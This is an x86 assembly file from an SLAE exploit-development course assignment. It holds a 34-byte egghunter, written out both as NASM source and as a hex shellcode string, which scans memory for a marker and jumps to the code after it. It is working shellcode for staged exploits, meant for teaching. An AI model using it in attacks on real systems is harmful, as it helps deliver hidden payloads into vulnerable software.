;Description:	Assignment #3 (EggHunter, 34 bytes)
;Shellcode:		\xd9\xee\x9b\xd9\x74\x24\xf4\x58\x40\x31\xdb\xb1\x02\x81\x3c\x18\xaa\xbb\xcc\xdd\x75\xf2\x83\xc3\x04\xfe\xc9\x75\xf0\x8d\x40\x08\xff\xe0
;Author: 		Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:		526

global _start
section .text
_start:
	fldz
	fstenv [esp-0xc]
	pop eax
lp1:
	inc eax
	xor ebx,ebx
	mov cl,2
lp3:
	cmp dword [eax+ebx],0xddccbbaa
	jne lp1
	add ebx,4
	dec cl
	jnz lp3
lp4:
	lea eax,[eax+8]
	jmp eax
